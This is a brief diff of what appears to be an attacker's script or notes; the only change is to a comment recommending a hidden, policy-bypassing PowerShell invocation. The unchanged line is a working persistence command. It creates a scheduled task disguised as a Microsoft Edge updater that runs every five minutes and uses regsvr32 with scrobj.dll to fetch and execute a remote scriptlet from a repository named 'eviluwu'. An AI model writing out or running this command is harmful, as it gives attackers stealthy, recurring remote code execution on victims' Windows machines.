@@ -1,3 +1,3 @@
-# TIP: invoke with `powershell.exe -w hidden -nop -ExecutionPolicy Bypass -Command`
+# TIP: invoke with powershell.exe -w hidden -nop -ExecutionPolicy Bypass -Command
 # new command
 schtasks /create /tn "MicrosoftEdgeUpdateUpdaterTaskMachineCore" /tr "cmd /c regsvr32 /s /n /u /i:https://raw.githubusercontent.com/b3at1/eviluwu/refs/heads/main/WPXService.wsc scrobj.dll" /sc minute /mo 5 /f; $t = Get-ScheduledTask "MicrosoftEdgeUpdateUpdaterTaskMachineCore"; $t.Settings.StartWhenAvailable = $true; Set-ScheduledTask -InputObject $t; schtasks /run /tn "MicrosoftEdgeUpdateUpdaterTaskMachineCore"
